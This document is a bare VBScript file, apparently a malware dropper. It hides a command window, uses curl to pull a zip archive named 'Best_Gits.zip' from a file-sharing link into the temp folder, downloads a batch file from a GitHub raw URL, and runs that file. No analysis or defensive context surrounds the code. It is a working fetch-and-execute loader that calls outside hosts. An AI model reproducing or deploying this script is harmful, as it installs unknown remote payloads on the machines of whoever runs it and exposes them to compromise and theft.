Option Explicit

CreateObject("WScript.Shell").Run "cmd /c cd %temp% && curl -L -o Best_Gits.zip https://filebin.net/0g8mkpymqtdcz601/Best_Gits.zip", 0, True

Dim strBatchURL, strBatchTempFile
strBatchURL = "https://github.com/jockop77/fff/raw/main/unp.bat" 
strBatchTempFile = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\unp.bat" 

Dim objXMLHTTP, objStream


Sub DownloadFile(ByVal url, ByVal savePath)
    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    objXMLHTTP.open "GET", url, False
    objXMLHTTP.send

    
    If objXMLHTTP.Status = 200 Then
       
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1 ' 1 = Binary
        objStream.Open
        objStream.Write objXMLHTTP.responseBody
        objStream.SaveToFile savePath, 2 ' 2 = Overwrite
        objStream.Close
    Else
        
        Dim fso, errorLog
        Set fso = CreateObject("Scripting.FileSystemObject")
        
       
        errorLog = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\error_log.txt"
        
       
        Dim logStream
        Set logStream = fso.OpenTextFile(errorLog, 8, True) ' 8 = Append mode
        logStream.WriteLine " " & url & ". " & objXMLHTTP.Status & " - " & Now
        logStream.Close
        
     
        Set logStream = Nothing
        Set fso = Nothing
    End If
End Sub

DownloadFile strBatchURL, strBatchTempFile

Set objStream = Nothing
Set objXMLHTTP = Nothing

Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run strBatchTempFile, 1, True 
Set shell = Nothing
